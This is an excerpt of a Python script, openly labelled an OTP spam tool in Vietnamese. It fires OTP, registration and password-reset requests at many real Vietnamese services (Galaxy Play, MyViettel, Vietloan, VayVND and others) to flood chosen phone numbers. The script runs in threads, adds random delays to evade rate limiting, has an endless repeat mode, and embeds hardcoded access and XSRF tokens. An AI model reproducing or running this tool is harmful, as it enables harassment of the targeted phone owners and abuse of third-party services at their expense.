...
def send_otp_via_medicare(sdt):
    cookies = {
        ...
        'XSRF-TOKEN': '%3D',
        'medicare_session': '%3D',
    }
    ...
    headers = {
        ...
        'X-XSRF-TOKEN': '',
...
def send_otp_via_galaxyplay(sdt):
    ...
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
...
def send_otp_via_medicare(sdt):
    headers = {
        ...
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-XSRF-TOKEN': '',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
...
def send_otp_via_myviettel2(sdt):
    headers = {
        ...
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM3UwNzYwMDAifQ==',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
...
def send_otp_via_myviettel3(sdt):
    ...
    print("OTP SEND myviettel 3:", response.text)
...
def send_otp_via_vietloan2(sdt):
    ...
    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
    print("OTP SEND vietloan2:", response.text)
...
def send_otp_via_vayvnd(sdt):
    ...
    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data)
    print("OTP SEND vayvnd:", response.text)


# Tạo danh sách tất cả các hàm OTP
all_otp_functions = [
    send_otp_via_sapo,
    ...
    send_otp_via_winmart,
    send_otp_via_medicare,  # Hàm này bị trùng lặp
...
def process_phone_number(phone_number, infinite_mode=False):
    """Xử lý gửi OTP cho một số điện thoại"""
    while True:
        print(f"\n{Fore.GREEN}=== Bắt đầu gửi OTP cho số: {phone_number} ==={Style.RESET_ALL}")
        
        # Chọn ngẫu nhiên một số hàm để gửi (không phải tất cả để tránh quá tải)
        num_functions = random.randint(5, 15)  # Chọn 5-15 hàm ngẫu nhiên
        selected_functions = random.sample(all_otp_functions, min(num_functions, len(all_otp_functions)))
        
        threads = []
        for func in selected_functions:
            semaphore.acquire()
            t = threading.Thread(target=func, args=(phone_number,))
            t.start()
            threads.append(t)
            time.sleep(random.uniform(0.1, 0.5))  # Delay ngẫu nhiên giữa các request
        ...
        print(f"\n{Fore.YELLOW}=== Hoàn thành một lượt gửi cho số: {phone_number} ==={Style.RESET_ALL}")
        
        if not infinite_mode:
            break
        
        # Delay ngẫu nhiên giữa các lượt gửi (từ 30 giây đến 2 phút)
        delay = random.randint(30, 120)
        print(f"{Fore.CYAN}Đợi {delay} giây trước khi gửi lượt tiếp theo...{Style.RESET_ALL}")
        time.sleep(delay)

def main():
    parser = argparse.ArgumentParser(description='Gửi OTP spam đến số điện thoại')
    parser.add_argument('phone_numbers', nargs='+', help='Số điện thoại cần spam (có thể nhiều số)')
    parser.add_argument('--infinite', action='store_true', help='Chạy vô hạn')
    
    args = parser.parse_args()
    
    print(f"{Fore.RED}====================================={Style.RESET_ALL}")
    print(f"{Fore.RED}     OTP SPAM TOOL - VÔ HẠN MODE     {Style.RESET_ALL}")
    print(f"{Fore.RED}====================================={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Số điện thoại: {', '.join(args.phone_numbers)}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Chế độ: {'VÔ HẠN' if args.infinite else 'MỘT LẦN'}{Style.RESET_ALL}")
    print(f"{Fore.RED}====================================={Style.RESET_ALL}\n")
    
    # Tạo thread cho mỗi số điện thoại
    threads = []
    for phone in args.phone_numbers:
        t = threading.Thread(target=process_phone_number, args=(phone, args.infinite))
        t.start()
        threads.append(t)
    
    # Đợi tất cả các thread hoàn thành (nếu không phải vô hạn)
    if not args.infinite:
        for t in threads:
            t.join()
        print(f"\n{Fore.GREEN}Hoàn thành gửi OTP cho tất cả số điện thoại!{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.GREEN}Đã bắt đầu chế độ vô hạn! Nhấn Ctrl+C để dừng.{Style.RESET_ALL}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Đã dừng chương trình!{Style.RESET_ALL}")
